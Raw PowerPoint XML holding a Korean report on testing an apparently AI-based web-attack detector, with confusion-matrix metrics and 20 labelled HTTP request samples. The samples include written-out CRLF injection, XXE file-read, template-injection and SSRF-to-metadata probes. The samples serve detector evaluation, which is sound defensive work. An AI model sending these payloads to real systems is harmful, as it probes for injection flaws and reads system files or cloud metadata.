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1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396ab2f9f247a2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="/docProps/app.xml" Id="R3a50d1d7daa149f7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="/ppt/presentation.xml" Id="Rc0ba785f949d47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2c2141311745fb"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:id="Ra644c5ec927348c1"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="256" r:id="R8acc6420fe9f4024"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="257" r:id="R187e5b5da637456a"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="258" r:id="Rae35ac7063374001"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="259" r:id="R59a1445076dc461f"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="260" r:id="R0205ed18037d4390"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="261" r:id="R9f7e7811f1b84098"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="262" r:id="Rd4f0bf95a2494ca6"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="263" r:id="R2c33b1169ef94b16"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="264" r:id="R706b26f0fec24164"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="265" r:id="Rafb5c0d4a08f486e"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="266" r:id="Rb7844ffffa894597"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="267" r:id="R66f43bf419dc474b"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="268" r:id="Rf406f9b671214271"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="269" r:id="R7563acc7811147ae"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="270" r:id="R5d7d011c1ce741a8"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="271" r:id="Rc2ed35e58881469a"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="272" r:id="Rac8f1100ecaa4b39"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="273" r:id="R8b36468c380a4628"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="274" r:id="R19a5edfea6f34eb3"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="275" r:id="R0bbd6f05e9884163"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="276" r:id="R62de75e3bae64564"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="277" r:id="Rc72262e542dd43d7"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="278" r:id="Rf6f6efdcc62448cd"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="279" r:id="R9487469624f04b5c"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="280" r:id="Rcb9d4f3ac88e4e21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ae659654894c75" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="/ppt/slideMasters/slideMaster1.xml" Id="R982c2141311745fb" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Ra644c5ec927348c1" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="/ppt/presProps.xml" Id="R389b327432c14ec2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="/ppt/tableStyles.xml" Id="R1dc6bea03a1f43e4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide1.xml" Id="R8acc6420fe9f4024" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide2.xml" Id="R187e5b5da637456a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide3.xml" Id="Rae35ac7063374001" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide4.xml" Id="R59a1445076dc461f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide5.xml" Id="R0205ed18037d4390" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide6.xml" Id="R9f7e7811f1b84098" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide7.xml" Id="Rd4f0bf95a2494ca6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide8.xml" Id="R2c33b1169ef94b16" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide9.xml" Id="R706b26f0fec24164" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide10.xml" Id="Rafb5c0d4a08f486e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide11.xml" Id="Rb7844ffffa894597" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide12.xml" Id="R66f43bf419dc474b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide13.xml" Id="Rf406f9b671214271" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide14.xml" Id="R7563acc7811147ae" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide15.xml" Id="R5d7d011c1ce741a8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide16.xml" Id="Rc2ed35e58881469a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide17.xml" Id="Rac8f1100ecaa4b39" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide18.xml" Id="R8b36468c380a4628" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide19.xml" Id="R19a5edfea6f34eb3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide20.xml" Id="R0bbd6f05e9884163" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide21.xml" Id="R62de75e3bae64564" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide22.xml" Id="Rc72262e542dd43d7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide23.xml" Id="Rf6f6efdcc62448cd" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide24.xml" Id="R9487469624f04b5c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide25.xml" Id="Rcb9d4f3ac88e4e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e150c326ee4f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a52d657b564828" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R2fe5f2f16ef345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29e87998064c45" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R8e8f7ec08e2e45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1a4644f8ed84ed3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R72894dcd554a42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a16922bea24da9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc66f14c7712049e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2c2833a050d4f79" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rf34ee13b0c564e4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0871671fdc642ca" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R5f2a9deb622247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e567479a02b460f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R96869a15bdc9461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cd1c79f20d64f5d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R6f9bdf93e083457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cffaa7e8a4c4a5c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R8915d54c9f2b471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fcd3bee6ee54c98" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R1249deed733e42b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66f5e44084a4a5a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rdf5b89b880ea473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5f03d7ad3e545a8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R24039d4fdbec445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d9bd5604c2f4404" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rf308e3c7a5fc483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84450c5bc5f4802" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Redc5c1636452453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ee97bfeabda4ea8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R210c61308a134e2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e75ecce45784ebc" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rce81ab69a1e047f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1cbf74d68194ff9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc0b3bb4cedf24d5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950e6e9b8a240f0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rff7277c9827242c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f2df1c8a6724c5a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R437ee320e5ce433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861bfcb949d452a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Re2c10068577f457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801cf87b88d4afe" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R2a5d5ba0bfe94c7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0b6e29fcbc545ef" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R82f3c257be7a472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11a711acf9c4596" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Ra38358718838420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496eae293b94567" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc1e4701ceec84af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077acbc68704ad3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R20c71a97fd0f42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사용자가 제공한 기존 테스트 과정과 결과를 정리한 자료. 작성일 2026-09-09. 현재 세션에서 서버 재전송·등록·플레이북 실행은 수행하지 않았다. 표기한 서버와 이름은 사용자 제공 정보다.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산출 근거: TP=10, FP=6, TN=4, FN=0. Accuracy=(TP+TN)/20=70%; TPR=TP/(TP+FN)=100%; Precision=TP/(TP+FP)=62.5%; FPR=FP/(FP+TN)=60%. 공격 라벨은 공격 의도·모사 기준이다.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정상 판정은 보안 정책 적합성 또는 무해성을 인증하는 의미가 아니다. 공격 판정은 공격 의도·모사 패턴 기준이다. 192.0.2.0/24는 RFC 5737의 문서용 TEST-NET-1 주소.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.rfc-editor.org/info/rfc5737/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설명을 재구성한 기존 테스트 흐름. 현재 세션에서 서버 연결, 로그 전송, 파서/이벤트 등록은 수행하지 않았다. LogGenerator README.md 264–275행은 프로토콜 선택, Host/Port 설정, 카탈로그·샘플 선택, IP/날짜, EPS, 전송 및 총 로그 수 확인 순서를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제공 정보: LogGenerator 파서, AITEST 일반 이벤트, AI TEST 티켓. 현재 설정값을 직접 조회하지 않았다. eyeCloudXOAR-playbook-guide_v4_ko.pdf p74, p77–80: 정오탐 분석과 payload, 결과 및 수동 피드백. 활성 알고리즘/모델 입력 매핑은 제공 자료에서 확인되지 않았다.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첨부 원본 PNG codex-clipboard-b275dc3b-4de1-4eb9-9aa0-9cb439990e1d.png. 화면 #3 이름은 말줄임 처리되어 있으므로 전체 명칭은 사용자 제공 티켓 상태 “정오탐 피드백 데이터 저장”을 따른다. 매뉴얼의 다른 명칭으로 교체하지 않았다. 현재 화면은 저장 완료 또는 재학습 완료의 증거가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티켓 목록 전문. 각 티켓의 제목 AI TEST, 담당자 미지정, 상태 분석/대응 ( 정오탐 피드백 데이터 저장 ). 날짜는 모두 2026-09-08. 두 목록을 정상군/공격군에 임의 매핑하지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000380 14:19:07</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000379 14:18:58</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000378 14:18:58</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000377 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000376 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000375 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000374 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000373 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000372 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000371 14:18:13</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000456 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000455 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000454 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000452 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000451 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000450 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000449 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000448 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000447 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000446 16:54:54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독립 계산: {"counts":{"TP":10,"FP":6,"TN":4,"FN":0},"metrics":{"accuracy":0.7,"recall":1,"precision":0.625,"fpr":0.6,"specificity":0.4,"f1":0.7692307692307693}}</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Accuracy=(TP+TN)/(TP+TN+FP+FN). Recall=TP/(TP+FN). Precision=TP/(TP+FP). FPR=FP/(FP+TN). Specificity=TN/(TN+FP). F1=2TP/(2TP+FP+FN). 혼동행렬 정의는 eyeCloudXOAR-playbook-guide_v4_ko.pdf p74·77–80과 부합한다.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20개 HTTP 요청과 모델 출력. S01~S20은 제공 순서로 부여한 보고서 식별자이며 티켓 ID와 매핑되지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S01 수동=정상 모델=공격 화면값=0.47 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /redirect?next=%2Fhome HTTP/1.1\r\nHost: host-37\r\nConnection: close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S02 수동=정상 모델=정상 화면값=0.39 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /upload HTTP/1.1\r\nHost: host-11\r\nContent-Type: multipart/form-data; boundary=EVALBOUNDARY\r\n\r\n--EVALBOUNDARY\r\nContent-Disposition: form-data; name="홍길동 11"; filename="C:/ProgramData/Your-Company/SecurityData/event-11.dat"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S03 수동=정상 모델=공격 화면값=0.48 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /login HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=user01&amp;password=incorrect-password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S04 수동=정상 모델=정상 화면값=0.30 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /health HTTP/1.1\r\nHost: host-22\r\nUser-Agent: kube-probe/1.30\r\nAccept: */*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S05 수동=정상 모델=공격 화면값=0.31 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /api/search HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/json\r\n\r\n{"operator":"union","fields":["name","department"],"page":1}</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>분류 기준 참고:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/18-Testing_for_Server-side_Template_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.rfc-editor.org/info/rfc5737/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20개 HTTP 요청과 모델 출력. S01~S20은 제공 순서로 부여한 보고서 식별자이며 티켓 ID와 매핑되지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S06 수동=정상 모델=공격 화면값=0.60 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /tools/ping HTTP/1.1\r\nHost: host-12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nhost=127.0.0.1&amp;count=4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S07 수동=정상 모델=정상 화면값=0.35 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /download?file=quarterly..final.pdf HTTP/1.1\r\nHost: host-41\r\nAccept: application/pdf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S08 수동=정상 모델=공격 화면값=0.43 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /docs/search?q=HTML%20script%20element%20reference HTTP/1.1\r\nHost: host-3\r\nReferer: [https://host-3/docs](https://host-3/docs)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S09 수동=정상 모델=정상 화면값=0.27 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /search?q=how%20to%20select%20a%20health%20plan HTTP/1.1\r\nHost: host-31\r\nAccept: text/html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S10 수동=정상 모델=공격 화면값=0.65 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /products?id=10&amp;sort=price&amp;direction=asc HTTP/1.1\r\nHost: host-7\r\nUser-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>분류 기준 참고:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/18-Testing_for_Server-side_Template_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.rfc-editor.org/info/rfc5737/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20개 HTTP 요청과 모델 출력. S01~S20은 제공 순서로 부여한 보고서 식별자이며 티켓 ID와 매핑되지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S11 수동=공격 모델=공격 화면값=0.43 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /redirect?next=%2Fhome%0D%0AX-Test-Injected%3A%20true HTTP/1.1\r\nHost: host-37\r\nConnection: close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S12 수동=공격 모델=공격 화면값=0.46 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /api/import HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/xml\r\n\r\n%3C%21DOCTYPE%20r%20%5B%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%5D%3E%3Cr%3E%26x%3B%3C%2Fr%3E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S13 수동=공격 모델=공격 화면값=0.37 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /welcome?name=%7B%7B7\*7%7D%7D HTTP/1.1\r\nHost: host-11\r\nAccept: text/html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S14 수동=공격 모델=공격 화면값=0.67 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /preview HTTP/1.1\r\nHost: host-22\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nurl=http%3A%2F%2F192.0.2.20%2Flatest%2Fmeta-data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S15 수동=공격 모델=공격 화면값=0.51 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
